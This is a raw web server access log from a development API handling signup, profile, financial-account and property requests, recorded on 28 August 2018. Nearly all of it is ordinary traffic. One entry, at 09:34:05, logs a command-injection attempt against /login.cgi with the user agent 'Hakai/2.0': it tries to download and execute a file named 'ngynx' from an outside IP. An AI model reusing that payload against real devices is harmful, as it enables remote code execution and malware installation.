ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:12 +0000] "GET /signup/status HTTP/1.1" 401 317 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:12 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:12 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:12 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:30:12 +0000] "OPTIONS /misc/get/all HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:12 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/aboutYou" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:12 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/aboutYou" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:30:12 +0000] "GET /misc/get/all HTTP/1.1" 200 3758 "http://localhost:4200/aboutYou" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:30:16 +0000] "GET /misc/get/all HTTP/1.1" 200 3758 "http://localhost:4200/aboutYou" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:30:21 +0000] "OPTIONS /misc/get/all HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:30:21 +0000] "GET /misc/get/all HTTP/1.1" 200 3758 "http://localhost:4200/aboutYou" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:26 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:27 +0000] "POST /user_details/user_details HTTP/1.1" 201 313 "http://localhost:4200/aboutYou" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:27 +0000] "OPTIONS /signup/status HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:27 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:27 +0000] "GET /signup/status HTTP/1.1" 200 707 "http://localhost:4200/aboutSuccess" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:27 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/aboutSuccess" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:30 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:30 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:30 +0000] "OPTIONS /financial/institutions HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:31 +0000] "GET /financial/institutions HTTP/1.1" 202 306 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:34 +0000] "PUT /properties/update_property HTTP/1.1" 401 298 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:31:26 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:31:26 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:31:26 +0000] "OPTIONS /financial/institutions HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:31:27 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:31:27 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:31:27 +0000] "GET /financial/institutions HTTP/1.1" 202 306 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 87.158.179.226 - - [28/Aug/2018:09:34:05 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://148.72.176.78/ngynx%20-O%20-%3E%20/tmp/ngynx;sh%20/tmp/ngynx%27$ HTTP/1.1" 400 0 "-" "Hakai/2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:09 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:09 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:09 +0000] "OPTIONS //property/property_linked HTTP/1.1" 200 225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:09 +0000] "OPTIONS //financial/accounts HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:10 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/userSettings/myaccount" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:10 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/userSettings/myaccount" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:10 +0000] "GET //financial/accounts HTTP/1.1" 400 400 "http://localhost:4200/userSettings/myaccount" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:11 +0000] "OPTIONS /property/property HTTP/1.1" 200 224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:11 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/userSettings/property" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:12 +0000] "OPTIONS /financial/institutions HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:13 +0000] "GET /financial/institutions HTTP/1.1" 202 306 "http://localhost:4200/userSettings/userAccount" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:31 +0000] "OPTIONS /financial/accounts HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:31 +0000] "POST /financial/accounts HTTP/1.1" 200 346 "http://localhost:4200/userSettings/userAccount" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:48 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:48 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:48 +0000] "OPTIONS /financial/institutions HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:49 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:49 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:36:49 +0000] "GET /financial/institutions HTTP/1.1" 202 306 "http://localhost:4200/accounts/link-account" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:39:14 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:39:15 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://13.54.91.199/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:42:00 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:42:00 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:42:02 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:42:02 +0000] "GET /signup/status HTTP/1.1" 401 321 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:42:02 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:42:02 +0000] "GET /signup/status HTTP/1.1" 401 321 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 116.50.59.180 - - [28/Aug/2018:09:44:00 +0000] "GET /signup/users HTTP/1.1" 200 2065 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:17 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:44:17 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:17 +0000] "GET /signup/status HTTP/1.1" 401 321 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:44:17 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:32 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:32 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:32 +0000] "OPTIONS /loyaltyrewards/programs HTTP/1.1" 200 225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:32 +0000] "GET /signup/status HTTP/1.1" 401 321 "http://localhost:4200/loyalty/loyalty" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:32 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/loyalty/loyalty" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:34 +0000] "GET /signup/status HTTP/1.1" 401 321 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:44:34 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 116.50.59.180 - - [28/Aug/2018:09:45:37 +0000] "POST /signup/register HTTP/1.1" 401 320 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 116.50.59.180 - - [28/Aug/2018:09:45:56 +0000] "POST /signup/register HTTP/1.1" 401 294 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 127.0.0.1 - - [28/Aug/2018:09:46:15 +0000] "POST /settings/profile HTTP/1.1" 201 299 "-" "python-requests/2.19.1"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 116.50.59.180 - - [28/Aug/2018:09:46:15 +0000] "POST /signup/register HTTP/1.1" 201 993 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 116.50.59.180 - - [28/Aug/2018:09:46:50 +0000] "POST /signup/login HTTP/1.1" 500 330 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:50:36 +0000] "GET /property/property_estimate HTTP/1.1" 404 520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:50:42 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:50:42 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:50:42 +0000] "GET /signup/status HTTP/1.1" 401 321 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:50:42 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:50:46 +0000] "GET /properties/property_estimate HTTP/1.1" 405 438 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:50:58 +0000] "GET /properties/property HTTP/1.1" 401 298 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:25 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:25 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:25 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:54:25 +0000] "OPTIONS /survey/total/points HTTP/1.1" 200 225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:54:25 +0000] "OPTIONS /user_details/user_details HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:54:25 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:25 +0000] "OPTIONS /misc/get/all HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:25 +0000] "GET /signup/status HTTP/1.1" 200 706 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:25 +0000] "GET /settings/profile HTTP/1.1" 200 2846 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:54:25 +0000] "GET /user_details/user_details HTTP/1.1" 200 878 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:54:26 +0000] "GET /misc/get/all HTTP/1.1" 200 3758 "http://localhost:4200/userSettings/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
